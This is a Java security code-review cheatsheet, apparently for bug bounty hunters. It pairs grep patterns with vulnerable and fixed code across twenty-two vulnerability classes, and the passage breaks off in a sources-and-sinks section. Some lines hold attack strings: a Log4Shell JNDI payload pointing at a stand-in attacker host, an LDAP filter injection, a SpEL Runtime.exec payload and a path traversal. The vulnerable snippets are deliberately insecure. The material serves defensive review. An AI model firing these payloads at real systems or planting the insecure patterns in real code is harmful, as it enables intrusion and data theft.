# Java Source Code Review Cheatsheet for Bug Bounty Hunters

> Practical, grep-ready reference. Assumes `rg` (ripgrep) available. All patterns are case-sensitive unless noted.

---

## Code Review Methodology (Start Here)

> Adapted from @ekoparty / Bug Bounty Space — the 4-step process for novice code reviewers.

### Step 1: Identify Sources and Sinks
Sources = where data is being **input** (user-controlled). Sinks = where data ends up being **processed** (dangerous operations). Your goal is to find paths where data flows from source to sink without proper sanitization.

### Step 2: Recon the Codebase — Map All Routes
Spend time doing "recon" on the codebase. Identify all routes and entry points first before looking for bugs.

```bash
# Java / Spring Boot
rg '@(Get|Post|Put|Delete|Patch|Request)Mapping' --type java -n
rg '@(Path|GET|POST|PUT|DELETE)\b' --type java -n          # JAX-RS

# web.xml (Servlet mappings)
rg '<servlet-mapping>|<url-pattern>' --include='web.xml' -A2

# application.xml / applicationContext.xml
rg '<bean |<mvc:' --include='*.xml' | grep -i 'controller\|handler\|mapping'

# Spring Boot auto-config — find base path
rg 'server\.servlet\.context-path|spring\.mvc\.servlet\.path' --include='*.properties' --include='*.yml'

# Struts — struts.xml action mappings
rg '<action |<result ' --include='struts.xml' --include='struts-*.xml' -n

# List ALL controller/resource classes
rg -l '@(Rest)?Controller|@Path\(' --type java | sort
```

### Step 3: Map Routes to Server-Side Functionality
For each route, note **all inputs** — parameters, headers, body, path variables, cookies. Be thorough, it's worth it.

```bash
# For each controller file, extract method signatures + their input annotations
for f in $(rg -l '@(Rest)?Controller|@Path\(' --type java); do
  echo "=== $f ==="
  rg '@(Get|Post|Put|Delete|Patch|Request)Mapping|@(GET|POST|PUT|DELETE)' -A5 "$f" | \
    grep -E '@|public |private |protected '
  echo ""
done

# Build a route inventory: METHOD | PATH | PARAMS | AUTH
rg -n '@(Get|Post|Put|Delete)Mapping\(' --type java | while read line; do
  file=$(echo "$line" | cut -d: -f1)
  # Check if the file has auth annotations
  auth="NO-AUTH"
  rg -q '@PreAuthorize|@Secured|@RolesAllowed' "$file" && auth="AUTH"
  echo "$line | $auth"
done
```

### Step 4: Trace Server-Side Flow (Source → Sink)
Go through the server-side flow from the **HTTP request (source)** to the point in code where it is **being processed (sink)**. Repeat this process for all other attack surface.

```
For EACH route:
  1. What inputs does it accept? (params, body, headers, path)
  2. Where do those inputs go? Follow the variable.
     - Passed to a service? → open that service class
     - Passed to a repository/DAO? → check query construction
     - Passed to a utility? → check if it hits file/net/exec
  3. Is there validation between source and sink?
     - None? → VULNERABILITY
     - Blocklist/regex? → likely bypassable
     - Allowlist or parameterized query? → probably safe
  4. Document: Route | Input | Sink | Validation | Verdict
```

---

## Quick Win Checklist (Run These First)

These 10 commands most commonly yield bounties within the first 30 minutes:

```bash
# 1. Hardcoded secrets / API keys
rg -i '(password|passwd|secret|api_key|apikey|token|aws_secret|private_key)\s*=\s*"[^"]{6,}"' --type java

# 2. SQL string concatenation (high-confidence SQLi)
rg 'executeQuery\s*\(\s*".*\+' --type java

# 3. Runtime.exec with user input nearby
rg 'Runtime\.getRuntime\(\)\.exec|ProcessBuilder' --type java -l

# 4. ObjectInputStream.readObject (deserialization)
rg 'readObject\(\)' --type java

# 5. Missing @PreAuthorize / @Secured on controllers
rg '@(Get|Post|Put|Delete|Patch)Mapping' --type java -l | xargs rg -L '@PreAuthorize|@Secured|@RolesAllowed'

# 6. Unescaped Thymeleaf expressions (XSS)
rg 'th:utext|th:innerHTML|\$\{.*\}' --include='*.html' -r

# 7. XXE — DocumentBuilderFactory without setFeature
rg 'DocumentBuilderFactory\.newInstance\(\)' --type java -l | xargs rg -L 'setFeature\|FEATURE_SECURE_PROCESSING'

# 8. SSRF — URL from user input fed into connection
rg 'new URL\s*\(|openConnection|RestTemplate|WebClient' --type java -l

# 9. SpEL injection
rg 'parseExpression\s*\(|ExpressionParser|SpelExpressionParser' --type java

# 10. Weak random for security tokens
rg 'new Random\(\)|Math\.random\(\)' --type java
```

---

## 1. SQL Injection

### Grep Patterns
```bash
# String concatenation in queries
rg 'createQuery\s*\(.*\+|createNativeQuery\s*\(.*\+|executeQuery\s*\(.*\+|prepareStatement\s*\(.*\+' --type java

# Named queries built with concat
rg 'Query\s+q\s*=.*\+|entityManager.*createQuery.*\+' --type java

# MyBatis — ${ } is unescaped (#{} is safe)
rg '\$\{[a-zA-Z]' --include='*.xml' --include='*.java'

# Spring Data — @Query with nativeQuery and SpEL
rg '@Query.*nativeQuery.*\+|\:#{' --type java
```

### Vulnerable
```java
// JDBC concatenation
String sql = "SELECT * FROM users WHERE name = '" + username + "'";
ResultSet rs = stmt.executeQuery(sql);

// JPA JPQL
Query q = em.createQuery("FROM User WHERE email = '" + email + "'");

// MyBatis mapper XML — ${} not escaped
SELECT * FROM orders WHERE user_id = ${userId}
```

### Fixed
```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, username);

// JPA named param
Query q = em.createQuery("FROM User WHERE email = :email").setParameter("email", email);

// MyBatis — use #{} not ${}
SELECT * FROM orders WHERE user_id = #{userId}
```

### Impact
Critical. Full database read/write, auth bypass, potential RCE via stacked queries or xp_cmdshell on MSSQL.

---

## 2. Command Injection

### Grep Patterns
```bash
rg 'Runtime\.getRuntime\(\)\.exec\s*\(' --type java
rg 'new ProcessBuilder\s*\(' --type java
rg '\.exec\s*\(.*request\.|\.exec\s*\(.*getParam' --type java

# Shell metacharacters often passed through
rg 'exec.*\+|ProcessBuilder.*\+' --type java
```

### Vulnerable
```java
String cmd = "ping " + request.getParameter("host");
Runtime.getRuntime().exec(cmd);

// ProcessBuilder with shell
new ProcessBuilder("bash", "-c", userInput).start();
```

### Fixed
```java
// Use array form — no shell interpretation
String[] cmd = {"ping", "-c", "4", sanitizedHost};
new ProcessBuilder(cmd).start();

// Whitelist allowable values; never pass raw input
```

### Impact
Critical. Direct OS command execution as application user.

---

## 3. SSRF

### Grep Patterns
```bash
rg 'new URL\s*\(|openConnection\(\)|openStream\(\)' --type java
rg 'HttpURLConnection|HttpClients\.createDefault|OkHttpClient' --type java -l
rg 'restTemplate\..*\(.*getParam|webClient\..*uri\(.*getParam' --type java
rg 'URI\.create\s*\(.*getParam|UriComponentsBuilder.*getParam' --type java

# AWS metadata canary check
rg '169\.254\.169\.254' --type java
```

### Vulnerable
```java
String url = request.getParameter("url");
URL u = new URL(url);
HttpURLConnection conn = (HttpURLConnection) u.openConnection();

// RestTemplate
String resp = restTemplate.getForObject(userSuppliedUrl, String.class);
```

### Fixed
```java
// Allowlist schemes and hosts
URI uri = URI.create(userInput);
if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new SecurityException();
// Also block redirects and private IP ranges
```

### Impact
High/Critical. Internal service access, cloud metadata exfiltration, port scanning, possible RCE.

---

## 4. Deserialization

### Grep Patterns
```bash
rg 'ObjectInputStream|readObject\(\)|readUnshared\(\)' --type java
rg 'XMLDecoder' --type java
rg 'XStream\.fromXML|xstream\.fromXML' --type java
rg 'Yaml\.load\s*\(|new Yaml\(\)\.load' --type java  # SnakeYAML unsafe load
rg 'enableDefaultTyping|@JsonTypeInfo.*Id\.CLASS' --type java  # Jackson polymorphic
rg 'SerializationUtils\.deserialize|BeanUtils\.populate' --type java
```

### Vulnerable
```java
// Java native
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // gadget chains → RCE

// SnakeYAML
new Yaml().load(userInput);  // allows arbitrary class construction

// Jackson
mapper.enableDefaultTyping();  // deprecated but still in old code
```

### Fixed
```java
// Use ValidatingObjectInputStream (Apache Commons IO)
ValidatingObjectInputStream vois = new ValidatingObjectInputStream(is);
vois.accept(AllowedClass.class);

// SnakeYAML safe load
new Yaml(new SafeConstructor()).load(input);

// Jackson — disable default typing
mapper.deactivateDefaultTyping();
```

### Impact
Critical. Remote code execution via gadget chains (ysoserial). Instant critical bounty.

---

## 5. XXE (XML External Entity)

### Grep Patterns
```bash
rg 'DocumentBuilderFactory\.newInstance\(\)' --type java -l | xargs rg -L 'setFeature\|FEATURE_SECURE'
rg 'SAXParserFactory\.newInstance\(\)|SAXParser|XMLReader\.parse' --type java
rg 'new XMLInputFactory\|XMLInputFactory\.newInstance' --type java  # StAX
rg 'TransformerFactory|SchemaFactory|ValidatorHandler' --type java
rg 'SAXReader|DOMReader' --type java  # dom4j
```

### Vulnerable
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream);  // XXE if no features set
```

### Fixed
```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### Impact
High. File read (/etc/passwd, source code), SSRF, potential RCE via jar:// URIs.

---

## 6. Server-Side Template Injection (SSTI)

### Grep Patterns
```bash
# Thymeleaf — dynamic template string (critical)
rg 'templateEngine\.process\s*\(.*getParam|SpringTemplateEngine.*process\(.*\+' --type java
rg 'return\s+"redirect:.*\+|return\s+"forward:.*\+' --type java  # Spring MVC view name injection

# Freemarker
rg 'new Template\s*\(.*getParam|cfg\.getTemplate.*\+|template\.process' --type java

# Velocity
rg 'Velocity\.evaluate\s*\(.*getParam|VelocityEngine.*evaluate' --type java

# Pebble
rg 'PebbleTemplate|pebbleEngine\.getLiteralTemplate' --type java
```

### Vulnerable
```java
// Thymeleaf view name injection (CVE-2021-43466 pattern)
@GetMapping("/path/{template}")
public String render(@PathVariable String template) {
    return template;  // attacker controls Spring MVC view name → SSTI
}

// Freemarker eval
String tmpl = request.getParameter("tmpl");
new Template("t", new StringReader(tmpl), cfg).process(model, out);
```

### Fixed
```java
// Thymeleaf — never return user input as view name
// Allowlist view names; use redirect: with validated paths only

// Freemarker — use template files, never user-supplied strings
Template t = cfg.getTemplate("safe-template.ftl");
```

### Impact
Critical. SSTI in Freemarker/Velocity → RCE. Thymeleaf view name → RCE via `__${T(java.lang.Runtime).getRuntime().exec(...)}__`.

---

## 7. Path Traversal

### Grep Patterns
```bash
rg 'new File\s*\(.*getParam|new File\s*\(.*\+' --type java
rg 'Paths\.get\s*\(.*getParam|FileSystems\.getDefault.*getParam' --type java
rg 'getResourceAsStream\s*\(.*\+|getResource\s*\(.*\+' --type java
rg 'transferTo\s*\(|Files\.copy\s*\(.*getParam' --type java

# Download endpoints
rg '@GetMapping.*download|@RequestParam.*fileName|@RequestParam.*path' --type java
```

### Vulnerable
```java
String filename = request.getParameter("file");
File f = new File("/var/uploads/" + filename);  // ../../etc/passwd
return new FileInputStream(f);
```

### Fixed
```java
String filename = request.getParameter("file");
Path base = Paths.get("/var/uploads").toRealPath();
Path resolved = base.resolve(filename).normalize().toRealPath();
if (!resolved.startsWith(base)) throw new SecurityException("Path traversal");
```

### Impact
High. Arbitrary file read. Combined with file upload → overwrite sensitive files.

---

## 8. IDOR / Broken Access Control

### Grep Patterns
```bash
# Controllers missing authorization annotations
rg '@(Get|Post|Put|Delete|Patch)Mapping' --type java -l | xargs rg -L '@PreAuthorize|@Secured|@RolesAllowed|hasRole\|hasAuthority'

# Direct DB lookup by user-supplied ID without ownership check
rg 'findById\s*\(.*getParam|findById\s*\(.*PathVariable|repository\.find.*getParam' --type java

# Principal not used in query (user object not checked)
rg 'findById\s*\(|getById\s*\(' --type java | rg -v 'principal\|getCurrentUser\|getUser\|SecurityContext'
```

### Vulnerable
```java
@GetMapping("/api/invoice/{id}")
public Invoice getInvoice(@PathVariable Long id) {
    return invoiceRepo.findById(id).get();  // no ownership check
}
```

### Fixed
```java
@GetMapping("/api/invoice/{id}")
@PreAuthorize("@invoiceService.belongsToUser(#id, authentication.name)")
public Invoice getInvoice(@PathVariable Long id) { ... }
```

### Impact
High. Access to other users' data. Common in REST APIs with sequential IDs.

---

## 9. Authentication Bypass / Weak Session Management

### Grep Patterns
```bash
# Predictable tokens — java.util.Random
rg 'new Random\(\)|Math\.random\(\)' --type java
rg 'UUID\.randomUUID' --type java  # UUID v4 is fine, but check how it's used for sessions

# Weak session config
rg 'setSecure\s*\(false\)|setHttpOnly\s*\(false\)' --type java
rg 'session\.setAttribute.*password|session\.setAttribute.*token' --type java

# Password comparison with == or equals (timing attack)
rg '\.equals\s*\(.*password\|password.*\.equals' --type java | rg -v 'MessageDigest\|BCrypt\|PasswordEncoder'

# Hardcoded admin checks
rg '"admin"\.equals\|\.equals\s*\("admin"\)' --type java
```

### Vulnerable
```java
// Predictable token
String token = String.valueOf(new Random().nextLong());

// Timing-vulnerable comparison
if (storedPassword.equals(userInput)) { ... }
```

### Fixed
```java
// Cryptographically secure
SecureRandom sr = new SecureRandom();
byte[] bytes = new byte[32];
sr.nextBytes(bytes);
String token = Base64.getUrlEncoder().encodeToString(bytes);

// Use constant-time comparison
MessageDigest.isEqual(expected.getBytes(), actual.getBytes());
// Or Spring Security's BCryptPasswordEncoder.matches()
```

### Impact
High/Critical. Account takeover, session hijacking.

---

## 10. XSS (Cross-Site Scripting)

### Grep Patterns
```bash
# JSP — unescaped output
rg '<%=\s*request\.getParam\|<%= .*getParam\|out\.print\s*\(.*getParam' --include='*.jsp'

# Thymeleaf — th:utext skips escaping
rg 'th:utext\s*=\s*"\$\{' --include='*.html'

# Spring MVC — @ResponseBody returning user input
rg '@ResponseBody' --type java -l | xargs rg 'getParam\|getHeader\|getQuery'

# Jackson serializing user input into HTML page inline
rg 'objectMapper\.writeValueAsString\|new ObjectMapper\(\)\.writeValue' --type java
```

### Vulnerable
```jsp
<!-- JSP unescaped -->
<div><%= request.getParameter("name") %></div>

<!-- Thymeleaf unescaped (th:utext vs th:text) -->
<p th:utext="${userComment}">comment</p>
```

### Fixed
```jsp
<!-- JSP — JSTL escaping -->
<c:out value="${param.name}" />

<!-- Thymeleaf — use th:text (auto-escapes) -->
<p th:text="${userComment}">comment</p>
```

### Impact
Medium/High. Stored XSS can be critical. DOM-based XSS common in SPAs pulling data from Spring APIs.

---

## 11. LDAP Injection

### Grep Patterns
```bash
rg 'DirContext|InitialDirContext|LdapTemplate|LdapQuery' --type java -l
rg 'search\s*\(.*getParam|filter\s*=.*getParam|\"\s*\+.*uid=\|uid=.*\+' --type java
rg 'NamingEnumeration|ldap://' --type java
```

### Vulnerable
```java
String filter = "(uid=" + username + ")";  // inject: *)(uid=*)(|(uid=*
DirContext ctx = new InitialDirContext(env);
ctx.search("ou=users,dc=corp,dc=com", filter, controls);
```

### Fixed
```java
// Use Spring's LdapQueryBuilder — parameterized
LdapQuery query = query().where("uid").is(username);
// Or manually escape using LdapEncoder.filterEncode()
String safe = LdapEncoder.filterEncode(username);
```

### Impact
High. Auth bypass, LDAP data extraction, potential account enumeration.

---

## 12. Expression Language Injection (SpEL / OGNL / MVEL / EL)

### Grep Patterns
```bash
# SpEL
rg 'parseExpression\s*\(|ExpressionParser|SpelExpressionParser|getValue\s*\(' --type java
rg '@Value\s*\("#\{.*getParam\|@Value.*\$\{.*request' --type java

# OGNL (Struts)
rg 'OgnlUtil|ognl\.Ognl|getValue\s*\(.*getParam' --type java
rg 'redirectAction:|actionChain:|action:' --include='*.xml'  # Struts namespace hijack

# MVEL
rg 'MVEL\.eval\s*\(.*getParam|MvelUtil\.eval' --type java

# EL in JSP directly from request param
rg '\$\{param\.' --include='*.jsp'
```

### Vulnerable
```java
// SpEL with user input
ExpressionParser parser = new SpelExpressionParser();
Expression expr = parser.parseExpression(userInput);  // RCE via T(java.lang.Runtime)
expr.getValue();
```

### Fixed
```java
// Use SimpleEvaluationContext — restricts to data access only, no method invocation
SimpleEvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
parser.parseExpression(template).getValue(ctx, model);
```

### Impact
Critical. SpEL/OGNL with user input = immediate RCE. Struts2 CVEs are all OGNL injection.

---

## 13. JWT Issues

### Grep Patterns
```bash
# "none" algorithm accepted
rg 'Algorithm\.none\|"none"\|alg.*none\|NONE' --type java

# Weak / hardcoded secret
rg 'HMACSHA256\s*\(.*"[^"]{1,20}"\|Jwts\.builder.*signWith.*"' --type java
rg 'secret\s*=\s*"[^"]{1,32}"\|jwtSecret\s*=\s*"' --type java

# Key confusion — RS256 to HS256 (using public key as HMAC secret)
rg 'getPublicKey\(\).*signWith\|publicKey.*HS256' --type java

# JWT library usage
rg 'Jwts\.\|JwtParser\|JWTVerifier\|JWT\.decode' --type java -l
```

### Vulnerable
```java
// Accepts "none" alg (JJWT old versions)
Jwts.parser().setSigningKey(secret).parseClaimsJws(token);
// If header changed to alg:none, older parsers skip verification

// Hardcoded weak secret
String secret = "password123";
```

### Fixed
```java
// Require specific algorithm
Jwts.parserBuilder()
    .setSigningKey(Keys.hmacShaKeyFor(secretBytes))
    .requireAlgorithm("HS256")
    .build()
    .parseClaimsJws(token);
```

### Impact
Critical. Token forgery → full account takeover, privilege escalation.

---

## 14. Open Redirect

### Grep Patterns
```bash
rg 'sendRedirect\s*\(.*getParam\|response\.sendRedirect.*\+' --type java
rg 'return\s*"redirect:.*getParam\|return\s*"redirect:.*\+' --type java
rg 'HttpHeaders.*Location.*getParam\|\.header\s*\("Location".*\+' --type java
rg '@RequestParam.*redirect|@RequestParam.*url|@RequestParam.*return' --type java
```

### Vulnerable
```java
String url = request.getParameter("next");
response.sendRedirect(url);  // redirect to evil.com

// Spring MVC
return "redirect:" + request.getParameter("returnUrl");
```

### Fixed
```java
String url = request.getParameter("next");
if (!url.startsWith("/") || url.startsWith("//")) {
    url = "/home";  // default safe redirect
}
response.sendRedirect(url);
// Or: validate against allowlist of domains
```

### Impact
Medium. Phishing, OAuth token theft via redirect_uri manipulation (can be critical in OAuth flows).

---

## 15. Log Injection / Log4Shell

### Grep Patterns
```bash
# Log4Shell (CVE-2021-44228) — log4j 2.x
rg 'log\.info\s*\(.*getParam\|log\.error\s*\(.*getParam\|logger\.(info|warn|error|debug)\s*\(.*request\.' --type java
rg 'log4j|log4j2|LogManager\.getLogger' --type java -l

# Log4j version check
find . -name "log4j*.jar" -o -name "pom.xml" | xargs grep -l "log4j" 2>/dev/null

# Generic log injection (CRLF in log lines)
rg 'logger\.\(.*getHeader\|logger\.\(.*getUserAgent' --type java
```

### Vulnerable
```java
// Log4Shell
logger.info("User login attempt: " + request.getParameter("username"));
// If username = "${jndi:ldap://attacker.com/a}" → RCE on log4j 2.0-2.14.1
```

### Fixed
```java
// Update log4j to 2.17.1+
// Set log4j2.formatMsgNoLookups=true
// Sanitize: strip ${} from user input before logging
String safe = username.replaceAll("\\$\\{", "\\${");
logger.info("Login attempt: {}", safe);
```

### Impact
Critical (Log4Shell). Log injection alone: Medium (log forgery, potential SIEM bypass).

---

## 16. Hardcoded Secrets / Credentials

### Grep Patterns
```bash
# Passwords and secrets
rg -i '(password|passwd|pwd|secret|api_key|apikey|api_secret|access_key|private_key)\s*[=:]\s*"[^"]{4,}"' --type java
rg -i '(password|secret|key)\s*[=:]\s*"[^"]{4,}"' --include='*.properties' --include='*.yml' --include='*.yaml'

# AWS / cloud keys
rg 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}' --type java
rg 'aws_access_key_id\s*=\s*[A-Z0-9]{20}' -i

# DB connection strings
rg 'jdbc:.*password=|datasource\.password\s*=' --type java --include='*.properties' --include='*.yml'

# Private keys inline
rg 'BEGIN RSA PRIVATE KEY|BEGIN PRIVATE KEY|BEGIN EC PRIVATE KEY'
```

### Vulnerable
```java
private static final String DB_PASS = "SuperSecret123!";
private static final String AWS_KEY = "AKIAIOSFODNN7EXAMPLE";
```

### Fixed
```java
// Read from environment / Vault / AWS Secrets Manager
String dbPass = System.getenv("DB_PASSWORD");
// Or Spring: @Value("${db.password}")
```

### Impact
Critical. Direct credential compromise, lateral movement, cloud account takeover.

---

## 17. Weak Cryptography

### Grep Patterns
```bash
# Broken algorithms
rg 'DES\b|DESede|RC4|RC2|Blowfish' --type java
rg '"MD5"\|"SHA-1"\|"SHA1"' --type java  # for password hashing (ok for checksums)
rg 'getInstance\s*\(".*ECB\|/ECB/' --type java  # ECB mode

# Static IV / key
rg 'static.*byte\[\].*key|static.*IvParameterSpec|private static.*KEY\s*=' --type java

# Insecure random seeding
rg 'new SecureRandom\s*\([0-9]' --type java  # seeded with constant
rg 'new Random\s*\([0-9]' --type java

# Weak TLS
rg 'SSLv3\|TLSv1\b\|TLSv1\.0\|TLSv1\.1' --type java
rg 'setHostnameVerifier.*return true\|ALLOW_ALL_HOSTNAME_VERIFIER' --type java
```

### Vulnerable
```java
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");  // ECB leaks patterns
MessageDigest.getInstance("MD5").digest(password.getBytes());  // no salt, fast hash

// Disabled TLS verification
SSLContext.setDefault(ctx);  // with TrustManager that accepts all certs
```

### Fixed
```java
Cipher.getInstance("AES/GCM/NoPadding");  // authenticated encryption
// Passwords: BCrypt, scrypt, Argon2
PasswordEncoder encoder = new BCryptPasswordEncoder(12);
```

### Impact
Medium/High. Weak password storage → mass account compromise. Broken TLS → MITM.

---

## 18. Race Conditions (TOCTOU)

### Grep Patterns
```bash
# Check-then-act on files
rg '\.exists\(\).*\.createNewFile\|\.exists\(\).*new FileOutputStream' --type java

# Non-atomic balance operations
rg 'getBalance\(\).*setBalance\|balance\s*=.*balance\s*[+-]' --type java | rg -v 'synchronized\|AtomicLong\|@Transactional'

# Missing @Transactional on read-modify-write
rg 'findById.*save\s*\(' --type java -l | xargs rg -L '@Transactional'

# Double-check without synchronization
rg 'if\s*\(.*null\).*=\s*new\|if\s*\(!.*)\s*{' --type java | rg -v 'synchronized\|volatile'
```

### Vulnerable
```java
// TOCTOU — race between check and use
if (!userService.hasUsedPromo(userId, promoCode)) {
    // another request sneaks through here
    applyPromo(userId, promoCode);
    markPromoUsed(userId, promoCode);
}
```

### Fixed
```java
@Transactional(isolation = Isolation.SERIALIZABLE)
public void applyPromo(Long userId, String promoCode) {
    // DB-level lock prevents concurrent redemption
    PromoUse lock = promoRepo.findByUserAndCodeForUpdate(userId, promoCode);
    if (lock != null) throw new AlreadyUsedException();
    ...
}
```

### Impact
High. Duplicate promo redemption, double-spend, concurrent request exploits. Good for fintech targets.

---

## 19. CORS Misconfiguration

### Grep Patterns
```bash
rg 'setAllowedOrigins\s*\("\*"\)\|allowedOrigins\s*=\s*"\*"' --type java
rg 'allowCredentials\s*=\s*true\|setAllowCredentials\s*\(true\)' --type java
rg '@CrossOrigin\s*\(\|@CrossOrigin$' --type java
rg 'addCorsMappings\|CorsConfiguration\|CorsFilter' --type java -l

# Reflect Origin header without validation
rg 'request\.getHeader\s*\("Origin"\).*response\|header.*Origin.*getHeader' --type java
```

### Vulnerable
```java
@CrossOrigin(origins = "*", allowCredentials = "true")  // invalid combo — browsers block, but check custom clients

// Worse: origin reflection
String origin = request.getHeader("Origin");
response.setHeader("Access-Control-Allow-Origin", origin);
response.setHeader("Access-Control-Allow-Credentials", "true");
```

### Fixed
```java
CorsConfiguration config = new CorsConfiguration();
config.setAllowedOrigins(Arrays.asList("https://app.example.com"));
config.setAllowCredentials(true);  // only with explicit origin allowlist
```

### Impact
High. Origin reflection + credentials = cross-origin authenticated requests from attacker site.

---

## 20. Mass Assignment

### Grep Patterns
```bash
# Spring @ModelAttribute binding — check what fields are exposed
rg '@ModelAttribute\b' --type java -l
rg 'BeanUtils\.copyProperties\|BeanWrapper\|setAsText' --type java

# Jackson — deserializing directly into entity
rg '@RequestBody.*User\b\|@RequestBody.*Account\b\|@RequestBody.*Order\b' --type java
rg 'objectMapper\.readValue.*getParam\|readValue.*request\.getInputStream' --type java

# Missing @JsonIgnore on sensitive fields
rg 'class User\|class Account\|class Profile' --type java -l | xargs rg -L '@JsonIgnore\|@JsonProperty.*access'
```

### Vulnerable
```java
@PostMapping("/update")
public void update(@RequestBody User user) {
    userRepo.save(user);  // attacker sends {"role":"ADMIN","active":true}
}
```

### Fixed
```java
// Use DTO — never bind directly to entity
@PostMapping("/update")
public void update(@RequestBody UpdateUserDTO dto) {
    User user = userRepo.findById(dto.getId()).get();
    user.setName(dto.getName());  // only update allowed fields
    userRepo.save(user);
}

// Or @JsonIgnore on sensitive fields
@JsonIgnore
private String role;
```

### Impact
High. Privilege escalation, account activation bypass, admin role assignment.

---

## 21. File Upload Vulnerabilities

### Grep Patterns
```bash
rg 'MultipartFile\|CommonsMultipartFile\|@RequestParam.*MultipartFile' --type java -l
rg 'getOriginalFilename\(\)\|getContentType\(\)' --type java
rg 'transferTo\s*\(|Files\.write.*upload\|FileOutputStream.*upload' --type java

# Check if content-type is trusted (client-controlled)
rg 'getContentType\(\).*equals\|contentType.*image\|contentType.*pdf' --type java | rg -v 'magic\|tika\|Apache Tika'

# JSP/JSPX upload to webroot
rg 'upload.*webapps\|upload.*wwwroot\|getRealPath\s*\(' --type java
```

### Vulnerable
```java
String filename = file.getOriginalFilename();  // client-controlled, path traversal possible
String contentType = file.getContentType();    // client-controlled, bypass by changing header
file.transferTo(new File("/uploads/" + filename));

// If uploads/ is under webroot → upload shell.jsp → RCE
```

### Fixed
```java
// Randomize filename
String ext = FilenameUtils.getExtension(original);
if (!ALLOWED_EXTENSIONS.contains(ext.toLowerCase())) throw new SecurityException();
String safe = UUID.randomUUID() + "." + ext;

// Detect content by magic bytes (Apache Tika)
Tika tika = new Tika();
String detected = tika.detect(file.getInputStream());

// Store outside webroot
file.transferTo(Paths.get("/var/secure-uploads/", safe).toFile());
```

### Impact
Critical if RCE via JSP shell. High for stored XSS via SVG. High for path traversal in filename.

---

## 22. WebSocket Security

### Grep Patterns
```bash
rg 'WebSocketConfigurer\|@EnableWebSocket\|WebSocketHandler' --type java -l
rg 'SockJS\|StompEndpointRegistry\|registerStompEndpoints' --type java

# CSRF protection on WebSocket handshake
rg 'addEndpoint\s*\(|withSockJS\(\)' --type java -l | xargs rg -L 'setAllowedOrigins\|addInterceptors\|HandshakeInterceptor'

# Message authentication
rg 'handleTextMessage\|handleBinaryMessage' --type java -l | xargs rg -L 'Principal\|Authentication\|SecurityContext'

# STOMP without auth
rg 'configureMessageBroker\|enableSimpleBroker\|setApplicationDestinationPrefixes' --type java -l | xargs rg -L 'ChannelInterceptor\|AuthorizationChannelInterceptor'
```

### Vulnerable
```java
// No origin check on WebSocket endpoint
registry.addEndpoint("/ws").withSockJS();  // any origin can connect

// STOMP handler processes messages without verifying user
@MessageMapping("/admin/action")
public void adminAction(ActionMessage msg) { ... }  // no auth check
```

### Fixed
```java
registry.addEndpoint("/ws")
    .setAllowedOrigins("https://app.example.com")  // explicit origin
    .withSockJS();

// Add auth interceptor
@MessageMapping("/admin/action")
public void adminAction(ActionMessage msg, Principal principal) {
    if (!isAdmin(principal)) throw new AccessDeniedException();
    ...
}
```

### Impact
High. Cross-site WebSocket hijacking (CSWSH), auth bypass, message injection, privilege escalation.

---

## Additional Quick Grep Combos

```bash
# Find all controller endpoints — quick overview
rg '@(RestController|Controller)' --type java -l | xargs rg '@(Get|Post|Put|Delete|Patch)Mapping' -l

# Find all places user input enters the application
rg '@RequestParam|@PathVariable|@RequestBody|request\.getParameter|request\.getHeader' --type java -l

# Find security config overrides (might be too permissive)
rg 'WebSecurityConfigurerAdapter\|SecurityFilterChain\|HttpSecurity' --type java -l

# Find disabled security
rg 'permitAll\(\)|antMatchers\("\*\*"\)\.permitAll\|csrf\(\)\.disable\(\)' --type java

# Properties files with secrets
find . -name "*.properties" -o -name "application*.yml" | xargs grep -i 'password\|secret\|key\|token' 2>/dev/null | grep -v '#'

# Dependency versions (look for known-vuln versions)
find . -name "pom.xml" | xargs grep -E 'log4j|struts|jackson-databind|shiro|spring-security' | grep '<version>'
```

---

## Framework-Specific Notes

### Spring Boot
- `application.properties` / `application.yml` — check for secrets, debug endpoints enabled
- `management.endpoints.web.exposure.include=*` → Spring Actuator fully exposed (heapdump, env, shutdown)
- `spring.jpa.show-sql=true` in prod may log sensitive SQL
- `@Transactional(readOnly=false)` missing on write ops → potential race conditions

### Struts 2
- Every OGNL injection CVE pattern: `%{...}` or `${...}` in redirect/result config
- `struts.devMode=true` in struts.xml → stack traces + OGNL eval
- Double-check namespace and action name params — many CVEs are namespace injection

### JSP / Servlet (Legacy)
- `web.xml` — check for `<security-constraint>` gaps, unrestricted URL patterns
- Scriptlets `<% %>` using request params directly → XSS, injection
- Session fixation if `getSession(true)` without `changeSessionId()` after login

### JAX-RS
- Check `@PermitAll` on sensitive endpoints
- Entity providers (`MessageBodyReader`) that deserialize without validation
- Media type wildcards accepting `application/xml` → XXE

---

---

## Sources & Sinks Identification Guide

The core of code review: trace **user-controlled data (sources)** into **dangerous operations (sinks)**. If data flows from source → sink without sanitization, you have a bug.

### Step 1: Map All Sources (User Input Entry Points)

```bash
# === HTTP Request Parameters ===
rg 'request\.getParameter\(|request\.getParameterValues\(|request\.getParameterMap\(' --type java
rg '@RequestParam|@PathVariable|@RequestBody|@RequestHeader|@CookieValue|@MatrixVariable' --type java
rg '@QueryParam|@PathParam|@FormParam|@HeaderParam|@BeanParam' --type java  # JAX-RS

# === Request body / payload ===
rg 'request\.getInputStream\(\)|request\.getReader\(\)|request\.getPart\(' --type java
rg '@RequestBody|@ModelAttribute|@RequestPart' --type java
rg 'IOUtils\.toString\(.*request|StreamUtils\.copy\(.*request' --type java

# === Headers & Cookies ===
rg 'request\.getHeader\(|request\.getHeaders\(|request\.getCookies\(' --type java
rg 'getHeader\("X-Forwarded|getHeader\("Host"|getHeader\("Referer"|getHeader\("Origin"' --type java

# === URL / URI path ===
rg 'request\.getRequestURI\(\)|request\.getRequestURL\(\)|request\.getServletPath\(' --type java
rg 'request\.getPathInfo\(\)|request\.getQueryString\(' --type java

# === File uploads ===
